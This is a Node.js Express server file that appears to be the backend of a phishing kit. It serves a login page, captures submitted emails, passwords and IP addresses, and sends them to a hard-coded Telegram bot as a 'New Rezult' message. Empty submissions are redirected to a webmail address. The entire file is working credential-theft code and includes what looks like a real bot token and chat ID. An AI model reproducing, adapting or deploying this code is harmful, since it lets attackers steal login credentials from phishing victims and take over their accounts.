const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();
const PORT = 3000;

// 🔹 Replace these with your actual Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = "7946945439:AAGeYhm4yOdyDpr8D3tIVb0qQiZk4q_q0F8";
const TELEGRAM_CHAT_ID = "7207894371";

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname)); // Serve index.html

// Serve index.html when visiting the root
app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
});

// Handle login requests
app.post("/", async (req, res) => {
    const { email, password, ip } = req.body;

    if (!email || !password) {
        return res.redirect('https://mail.nctc.com/')
    }

    const message = `🔹🌍🌍 **New Rezult** 🌍🌍🔹\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 IP: ${ip}\n🕒 Time: ${new Date().toISOString()}\n🌍🌍REDDOT_SECURITY🌍🌍`;

    try {
        // Send to Telegram
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown",
        });

        console.log("Sent to Telegram:", message);
        res.json({ redirect: true });
    } catch (error) {
        console.error("Error sending to Telegram:", error);
        res.status(500).json({ error: "Failed to send to Telegram" });
    }
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
